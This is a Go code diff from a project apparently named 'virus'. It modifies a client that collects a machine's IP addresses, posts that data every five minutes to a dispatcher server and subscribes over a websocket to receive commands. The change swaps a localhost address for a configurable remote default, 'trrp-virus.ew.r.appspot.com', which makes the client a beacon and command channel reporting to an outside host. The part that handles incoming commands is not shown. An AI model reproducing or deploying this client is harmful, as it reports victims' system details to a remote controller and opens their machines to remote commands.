@@ -9,20 +9,20 @@ import (
 	"time"
 
 	"github.com/gorilla/websocket"
-
+	"github.com/jessevdk/go-flags"
 	"github.com/kolya59/virus/common/machine"
 	"github.com/kolya59/virus/common/models"
 )
 
-const (
-	dispatcherHost = "127.0.0.1:8080"
-)
+type options struct {
+	DispatcherURL string `long:"dispatcher-host" env:"DISPATCHER" required:"true" default:"trrp-virus.ew.r.appspot.com"`
+}
 
 var (
 	interval = 5 * time.Minute
 )
 
-func sendData(machine machine.Machine) error {
+func sendData(machine machine.Machine, dispatcherHost string) error {
 	// Marshal data
 	raw, err := json.Marshal(machine)
 	if err != nil {
@@ -43,7 +43,7 @@ func sendData(machine machine.Machine) error {
 	return nil
 }
 
-func subscribeForCommands() error {
+func subscribeForCommands(dispatcherHost string) error {
 	u := url.URL{Scheme: "ws", Host: dispatcherHost, Path: "/subscribe"}
 
 	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
@@ -85,12 +85,18 @@ func subscribeForCommands() error {
 }
 
 func main() {
+	var opts options
+	if _, err := flags.Parse(&opts); err != nil {
+		return
+	}
+	dispatcherHost := opts.DispatcherURL
+
 	m := machine.Machine{}
 	m.GetIPS()
 
 	ticker := time.NewTicker(interval)
 	errs := make(chan error, 1)
-	errs <- sendData(m)
+	errs <- sendData(m, dispatcherHost)
 loopSend:
 	for {
 		select {
@@ -99,11 +105,11 @@ loopSend:
 				break loopSend
 			}
 		case <-ticker.C:
-			errs <- sendData(m)
+			errs <- sendData(m, dispatcherHost)
 		}
 	}
 
-	errs <- subscribeForCommands()
+	errs <- subscribeForCommands(dispatcherHost)
 loopSub:
 	for {
 		select {
@@ -112,7 +118,7 @@ loopSub:
 				break loopSub
 			}
 		case <-ticker.C:
-			errs <- subscribeForCommands()
+			errs <- subscribeForCommands(dispatcherHost)
 		}
 	}
 }
